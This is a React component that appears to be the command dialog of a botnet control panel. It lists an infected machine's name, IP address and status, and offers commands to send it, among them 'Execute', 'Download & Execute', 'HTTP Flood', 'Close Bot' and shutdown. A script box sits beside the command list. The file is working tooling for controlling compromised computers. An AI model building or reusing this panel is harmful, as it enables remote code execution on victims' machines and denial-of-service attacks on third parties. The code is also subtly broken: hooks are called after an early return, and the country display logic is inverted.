import React, { useState } from 'react';

const TransferModal = (props: any) => {
    if (!props.isOpen) return null;

    const [textContent, setTextContent] = useState("");
    const [selectedOption, setSelectedOption] = useState("");

    return (
        <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex justify-center items-center z-[9999]">
            <div className="bg-white p-6 rounded-lg shadow-lg max-w-lg w-full">
                <h2 className="text-xl font-semibold mb-4">Sending Commands</h2>
                <div className="mb-4 flex">
                    <label className="font-semibold text-gray-700 flex-2">Computer Name:</label>
                    <div className="text-gray-900 flex-1 pl-2">{props.user.computerName}</div>
                </div>
                <div className="mb-4 flex">
                    <label className="font-semibold text-gray-700 flex-2">IP Address:</label>
                    <div className="text-gray-900 flex-1 pl-2">{props.user.ipAddress}</div>
                </div>
                <div className="mb-4 flex">
                    <label className="font-semibold text-gray-700 flex-2">Country:</label>
                    <div className="text-gray-900 flex-1 pl-2">{props.user.country == undefined ? 'United State' : 'N/A'}</div>
                </div>
                <div className="mb-4 flex">
                    <label className="font-semibold text-gray-700 flex-2">Status:</label>
                    <div className="text-gray-900 flex-1 pl-2">{props.user.status}</div>
                </div>
                <div className="mb-4 flex">
                    <label className="font-semibold text-gray-700 flex-2">Last Active Time:</label>
                    <div className="text-gray-900 flex-1 pl-2">{props.user.lastActiveTime}</div>
                </div>
                <div className="mb-4 flex">
                    <label className="font-semibold text-gray-700 flex-2">Additional System Details:</label>
                    <div className="text-gray-900 flex-1 pl-2">{props.user.additionalSystemDetails}</div>
                </div>

                <div className="mb-4">
                    <label className="font-semibold text-gray-700 flex-2">Type:</label><br/>
                    <select
                        value={selectedOption}
                        onChange={(e) => setSelectedOption(e.target.value)}
                        className="mt-1 block w-full p-2 border border-gray-300 bg-white rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
                    >
                        <option value="">Choose One</option>
                        <option value="messagebox">MessageBox</option>
                        <option value="execute">Execute</option>
                        <option value="download_execute">Download & Execute</option>
                        <option value="http_flood">HTTP Flood</option>
                        <option value="visit_page">Visit Page</option>
                        <option value="close_bot">Close Bot</option>
                        <option value="shutdown">Shutdown</option>
                        <option value="restart">Restart</option>
                        <option value="hibernate">Hibernate</option>
                        <option value="logoff">Log Off</option>
                        <option value="abort">Abort</option>
                    </select>
                </div>

                <div className="mb-4">
                    <label className="font-semibold text-gray-700 flex-2">Scripts:</label><br/>
                    <textarea 
                        className='w-full h-[80px] border border-gray-300 rounded-lg shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all resize-none bg-white text-gray-800 p-3'
                        onChange={e => setTextContent(e.target.value)}
                        value={textContent}
                    ></textarea>
                </div>

                <div className="flex justify-end">
                    <button
                        onClick={() => props.handleProcess(props.user, selectedOption, textContent)}
                        className="mr-2 bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-700 transition"
                    >
                        Send Command
                    </button>
                    <button
                        className="bg-red-500 text-white py-2 px-4 rounded hover:bg-red-700 transition"
                        onClick={() => props.setIsOpen(false)}
                    >
                        Close
                    </button>
                </div>
            </div>
        </div>
    );
};

export default TransferModal;